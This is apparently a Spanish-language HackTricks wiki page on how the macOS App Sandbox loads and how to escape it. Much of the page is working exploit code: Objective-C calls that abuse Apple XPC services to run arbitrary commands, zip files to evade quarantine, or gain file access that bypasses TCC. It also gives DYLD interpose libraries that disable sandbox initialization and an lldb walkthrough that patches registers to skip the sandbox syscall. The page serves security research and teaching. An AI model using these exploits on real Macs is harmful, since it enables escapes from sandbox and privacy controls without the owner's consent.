# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Proceso de carga del Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Imagen de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

En la imagen anterior es posible observar **cómo se cargará el sandbox** cuando se ejecute una aplicación con el derecho **`com.apple.security.app-sandbox`**.

El compilador vinculará `/usr/lib/libSystem.B.dylib` al binario.

Luego, **`libSystem.B`** llamará a varias funciones hasta que **`xpc_pipe_routine`** envíe los derechos de la aplicación a **`securityd`**. Securityd verifica si el proceso debe estar en cuarentena dentro del Sandbox, y si es así, será puesto en cuarentena.\
Finalmente, el sandbox se activará con una llamada a **`__sandbox_ms`** que llamará a **`__mac_syscall`**.

## Posibles Bypass

### Eludir el atributo de cuarentena

**Los archivos creados por procesos en sandbox** se les añade el **atributo de cuarentena** para prevenir escapes del sandbox. Sin embargo, si logras **crear una carpeta `.app` sin el atributo de cuarentena** dentro de una aplicación en sandbox, podrías hacer que el binario del paquete de la aplicación apunte a **`/bin/bash`** y agregar algunas variables de entorno en el **plist** para abusar de **`open`** y **lanzar la nueva aplicación sin sandbox**.

Esto es lo que se hizo en [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

> [!CAUTION]
> Por lo tanto, en este momento, si solo eres capaz de crear una carpeta con un nombre que termine en **`.app`** sin un atributo de cuarentena, puedes escapar del sandbox porque macOS solo **verifica** el **atributo de cuarentena** en la **carpeta `.app`** y en el **ejecutable principal** (y apuntaremos el ejecutable principal a **`/bin/bash`**).
>
> Ten en cuenta que si un paquete .app ya ha sido autorizado para ejecutarse (tiene un xttr de cuarentena con la bandera de autorizado para ejecutar activada), también podrías abusar de él... excepto que ahora no puedes escribir dentro de los paquetes **`.app`** a menos que tengas algunos permisos privilegiados de TCC (que no tendrás dentro de un sandbox alto).

### Abusando de la funcionalidad Open

En los [**últimos ejemplos de elusión del sandbox de Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) se puede apreciar cómo la funcionalidad cli de **`open`** podría ser abusada para eludir el sandbox.

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Agentes/Daemon de Lanzamiento

Incluso si una aplicación está **destinada a estar en sandbox** (`com.apple.security.app-sandbox`), es posible eludir el sandbox si se **ejecuta desde un LaunchAgent** (`~/Library/LaunchAgents`) por ejemplo.\
Como se explicó en [**esta publicación**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), si deseas obtener persistencia con una aplicación que está en sandbox, podrías hacer que se ejecute automáticamente como un LaunchAgent y tal vez inyectar código malicioso a través de variables de entorno DyLib.

### Abusando de las Ubicaciones de Inicio Automático

Si un proceso en sandbox puede **escribir** en un lugar donde **más tarde una aplicación sin sandbox va a ejecutar el binario**, podrá **escapar simplemente colocando** allí el binario. Un buen ejemplo de este tipo de ubicaciones son `~/Library/LaunchAgents` o `/System/Library/LaunchDaemons`.

Para esto podrías necesitar incluso **2 pasos**: Hacer que un proceso con un **sandbox más permisivo** (`file-read*`, `file-write*`) ejecute tu código que realmente escribirá en un lugar donde será **ejecutado sin sandbox**.

Consulta esta página sobre **Ubicaciones de Inicio Automático**:

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusando de otros procesos

Si desde el proceso en sandbox puedes **comprometer otros procesos** que se ejecutan en sandboxes menos restrictivos (o ninguno), podrás escapar a sus sandboxes:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Servicios Mach del Sistema y del Usuario Disponibles

El sandbox también permite comunicarse con ciertos **servicios Mach** a través de XPC definidos en el perfil `application.sb`. Si puedes **abusar** de uno de estos servicios, podrías ser capaz de **escapar del sandbox**.

Como se indica en [este informe](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), la información sobre los servicios Mach se almacena en `/System/Library/xpc/launchd.plist`. Es posible encontrar todos los servicios Mach del Sistema y del Usuario buscando dentro de ese archivo por `<string>System</string>` y `<string>User</string>`.

Además, es posible verificar si un servicio Mach está disponible para una aplicación en sandbox llamando a `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Servicios Mach de PID disponibles

Estos servicios Mach fueron abusados por primera vez para [escapar del sandbox en este artículo](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). En ese momento, **todos los servicios XPC requeridos** por una aplicación y su marco eran visibles en el dominio PID de la aplicación (estos son servicios Mach con `ServiceType` como `Application`).

Para **contactar un servicio XPC del dominio PID**, solo es necesario registrarlo dentro de la aplicación con una línea como:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Además, es posible encontrar todos los servicios Mach de **Application** buscando dentro de `System/Library/xpc/launchd.plist` por `<string>Application</string>`.

Otra forma de encontrar servicios xpc válidos es verificar los que están en:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Varios ejemplos que abusan de esta técnica se pueden encontrar en el [**escrito original**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), sin embargo, los siguientes son algunos ejemplos resumidos.

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Este servicio permite todas las conexiones XPC al devolver siempre `YES` y el método `runTask:arguments:withReply:` ejecuta un comando arbitrario con parámetros arbitrarios.

La explotación fue "tan simple como":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Este servicio XPC permitía a cada cliente al devolver siempre YES y el método `createZipAtPath:hourThreshold:withReply:` básicamente permitía indicar la ruta a una carpeta para comprimir y la comprimiría en un archivo ZIP.

Por lo tanto, es posible generar una estructura de carpeta de aplicación falsa, comprimirla, luego descomprimirla y ejecutarla para escapar del sandbox ya que los nuevos archivos no tendrán el atributo de cuarentena.

La explotación fue:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Este servicio XPC permite otorgar acceso de lectura y escritura a una URL arbitraria al cliente XPC a través del método `extendAccessToURL:completion:`, que acepta cualquier conexión. Dado que el servicio XPC tiene FDA, es posible abusar de estos permisos para eludir completamente TCC.

La explotación fue:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Compilación Estática y Enlace Dinámico

[**Esta investigación**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descubrió 2 formas de eludir el Sandbox. Debido a que el sandbox se aplica desde el espacio de usuario cuando se carga la biblioteca **libSystem**. Si un binario pudiera evitar cargarla, nunca sería sandboxed:

- Si el binario estuviera **completamente compilado de forma estática**, podría evitar cargar esa biblioteca.
- Si el **binario no necesitara cargar ninguna biblioteca** (porque el enlazador también está en libSystem), no necesitará cargar libSystem.

### Shellcodes

Tenga en cuenta que **incluso los shellcodes** en ARM64 necesitan estar enlazados en `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Restricciones no heredadas

Como se explica en el **[bonus de este informe](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, una restricción de sandbox como:
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
puede ser eludido por un nuevo proceso ejecutándose, por ejemplo:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Sin embargo, por supuesto, este nuevo proceso no heredará derechos o privilegios del proceso padre.

### Derechos

Tenga en cuenta que incluso si algunas **acciones** pueden ser **permitidas por el sandbox** si una aplicación tiene un **derecho** específico, como en:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Para más información sobre **Interposting** consulta:

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` para prevenir el sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interponer `__mac_syscall` para prevenir el Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Depurar y eludir Sandbox con lldb

Compilaremos una aplicación que debería estar en sandbox: 

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Luego compila la aplicación:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> La aplicación intentará **leer** el archivo **`~/Desktop/del.txt`**, que el **Sandbox no permitirá**.\
> Crea un archivo allí, ya que una vez que el Sandbox sea eludido, podrá leerlo:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Vamos a depurar la aplicación para ver cuándo se carga el Sandbox:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Incluso con el Sandbox el TCC** pedirá al usuario si desea permitir que el proceso lea archivos del escritorio

## References

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
